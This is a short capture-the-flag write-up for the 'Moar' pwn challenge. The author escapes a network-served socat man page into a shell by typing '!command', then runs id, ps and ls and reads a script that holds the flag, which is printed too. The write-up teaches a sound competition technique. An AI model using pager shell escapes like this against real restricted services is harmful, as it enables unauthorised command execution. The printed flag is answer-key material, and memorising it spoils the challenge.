### Moar / PWN / Foobanizer9000

Flag: `CTF{SOmething-CATastr0phic}`

> Finding yourself on the Foobanizer9000, a computer built by 9000 foos, this computer is so complicated luckily it serves manual pages through a network service. As the old saying goes, everything you need is in the manual.

`$ nc moar.ctfcompetition.com 1337`

When you connect to the CTF server you enter the socat manual. If you know how to execute a command when viewing a manual page rendered by `man` this challenge is easy. Just enter `!` + `command` + `<enter>` and your command is executed.

My discovery steps (summarized):

What user are running as?

```
!id
uid=1337(moar) gid=1337(moar) groups=1337(moar)
```

What processes are running? Small list so I assume we are running in a container.

```
!ps axuw
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
moar         1  0.0  0.0  30664  3200 ?        SNs  08:29   0:00 /usr/bin/socat - EXEC:/usr/bin/man socat,ptmx,stderr,setsid,sigint,
moar         2  0.0  0.0  15276  2348 ?        SNs  08:29   0:00 /usr/bin/man socat
moar        11  0.0  0.0  15144   360 ?        SN   08:29   0:00 /usr/bin/man socat
moar        12  0.0  0.0   6744   844 ?        SN   08:29   0:00 pager
moar        19  0.0  0.0   4504   748 ?        SN   08:29   0:00 sh -c ps axuw
moar        20  0.0  0.0  34424  2912 ?        RN   08:29   0:00 ps axuw
```

Any user homedirs? Guess based on the run-as user `moar`:

```
!ls -al /home
total 12
drwxr-xr-x  3 nobody nogroup 4096 Jun 14 14:17 .
drwxr-xr-x 21 moar   moar    4096 Jun 22 09:20 ..
drwxr-xr-x  2 nobody nogroup 4096 Jun 22 08:36 moar
```

We're in luck! A homedir with interesting content!

```
!ls -al /home/moar
total 24
drwxr-xr-x 2 nobody nogroup 4096 Jun 22 08:36 .
drwxr-xr-x 3 nobody nogroup 4096 Jun 14 14:17 ..
-rw-r--r-- 1 nobody nogroup  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 nobody nogroup 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 nobody nogroup  655 May 16  2017 .profile
-r-xr-xr-x 1 nobody nogroup  118 Jun 22 07:58 disable_dmz.sh
```

And voila:

```
!cat /home/moar/disable_dmz.sh
#!/bin/sh
echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
echo CTF{SOmething-CATastr0phic} > /dev/dmz
```
